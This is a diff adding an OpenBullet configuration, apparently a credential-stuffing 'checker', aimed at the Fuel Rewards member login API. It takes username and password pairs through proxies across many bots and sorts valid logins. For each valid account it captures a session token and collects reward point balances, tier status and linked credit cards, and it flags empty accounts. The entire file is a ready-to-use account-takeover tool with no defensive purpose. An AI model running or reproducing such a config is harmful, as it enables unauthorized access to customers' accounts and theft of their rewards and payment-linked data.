@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "Name": "Fuel Rewards",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-23T01:09:23.6406075-07:00",
+  "AdditionalInfo": "",
+  "Author": "Aquizzity#1000",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://member-connect.excentus.com/fuelrewards/public/rest/v2/frnExcentus/login" 
+  CONTENT "{\"userId\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "tags: [{\"deviceType\":\"and\",\"deviceModeType\":\"cons\",\"deviceOSVer\":\"5.1.1\",\"DeviceID\":\"SM-G930K\"}]" 
+  HEADER "access_token: 01b3d21a-a5f8-4b67-99a4-3421a1ab75a5" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G930K Build/NRD90M)" 
+  HEADER "Host: member-connect.excentus.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 56" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "responseCode\":\"SUCCESS\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "User name or password not recognized" 
+
+PARSE "<SOURCE>" JSON "memberAccessToken" -> VAR "aToken" 
+
+REQUEST GET "https://member-connect.excentus.com/fuelrewards/public/rest/v2/frnExcentus/members/26189713/balances?groupBy=BY_OFFER" 
+  
+  HEADER "Content-Type: application/json" 
+  HEADER "memberAccessToken: <aToken>" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G930K Build/NRD90M)" 
+  HEADER "Host: member-connect.excentus.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "totalRewards" CreateEmpty=FALSE -> CAP "Reward Points" 
+
+REQUEST GET "https://member-connect.excentus.com/fuelrewards/public/rest/v2/frnExcentus/members/26189713/attributes" 
+  
+  HEADER "Content-Type: application/json" 
+  HEADER "memberAccessToken: <aToken>" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G930K Build/NRD90M)" 
+  HEADER "Host: member-connect.excentus.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "Tier Status" 
+
+REQUEST GET "https://member-connect.excentus.com/fuelrewards/public/rest/v2/frnExcentus/members/26189713/cards" 
+  
+  HEADER "Content-Type: application/json" 
+  HEADER "memberAccessToken: <aToken>" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G930K Build/NRD90M)" 
+  HEADER "Host: member-connect.excentus.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "retailerCards" CreateEmpty=FALSE -> CAP "Credit Cards" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Reward Points>" LessThan "1" 
+    KEY "<Credit Cards>" EqualTo "[]" 
+
